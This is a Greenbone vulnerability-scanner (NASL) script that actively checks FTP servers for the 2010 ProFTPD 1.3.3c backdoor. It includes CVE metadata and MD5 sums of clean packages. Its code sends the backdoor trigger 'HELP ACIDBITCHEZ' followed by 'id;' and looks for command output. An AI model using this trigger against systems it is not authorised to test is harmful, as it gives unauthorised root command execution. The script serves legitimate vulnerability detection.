# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:proftpd:proftpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100933");
  script_version("2025-09-25T05:39:09+0000");
  script_tag(name:"last_modification", value:"2025-09-25 05:39:09 +0000 (Thu, 25 Sep 2025)");
  script_tag(name:"creation_date", value:"2010-12-02 19:42:22 +0100 (Thu, 02 Dec 2010)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2025-09-24 17:02:12 +0000 (Wed, 24 Sep 2025)");

  script_cve_id("CVE-2010-20103");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ProFTPD Backdoor Unauthorized Access Vulnerability (Dec 2010) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Gain a shell remotely");
  script_dependencies("gb_proftpd_consolidation.nasl");
  script_mandatory_keys("proftpd/ftp/detected");
  script_require_ports("Services/ftp", 21);

  script_tag(name:"summary", value:"ProFTPD is prone to an unauthorized access vulnerability due
  to a backdoor in certain versions of the application.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted FTP commands and checks the
  responses.");

  script_tag(name:"impact", value:"Exploiting this issue allows remote attackers to execute
  arbitrary system commands with superuser privileges.");

  script_tag(name:"affected", value:"The issue affects the ProFTPD 1.3.3c package downloaded
  between November 28 and December 2, 2010.

  The MD5 sums of the unaffected ProFTPD 1.3.3c source packages are as follows:

  8571bd78874b557e98480ed48e2df1d2 proftpd-1.3.3c.tar.bz2

  4f2c554d6273b8145095837913ba9e5d proftpd-1.3.3c.tar.gz

  Files with MD5 sums other than those listed above should be considered affected.");

  script_tag(name:"solution", value:"The vendor released an advisory to address the issue. Please
  see the references for more information.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20110917012335/http://www.securityfocus.com/bid/45150");
  script_xref(name:"URL", value:"http://sourceforge.net/mailarchive/message.php?msg_name=alpine.DEB.2.00.1012011542220.12930%40familiar.castaglia.org");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/15662");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/16921");

  exit(0);
}

include("host_details.inc");
include("ftp_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"ftp" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) ) # nb: To have a reference to the Detection-VT
  exit( 0 );

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

ftp_recv_line( socket:soc );

ex = string( "HELP ACIDBITCHEZ" );
r  = ftp_send_cmd( socket:soc, cmd:ex );

if( "502" >< r )
  exit( 0 ); # 502 Unknown command 'ACIDBITCHEZ'

r1 = ftp_send_cmd( socket:soc, cmd:string( "id;" ) );

ftp_close( socket:soc );
if( ! r1 )
  exit( 0 );

if( egrep( pattern:"uid=[0-9]+.*gid=[0-9]+", string:r1 ) ) {
  report = 'It was possible to execute the command "id" on the remote host, which produces the following output:\n\n' + r1;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
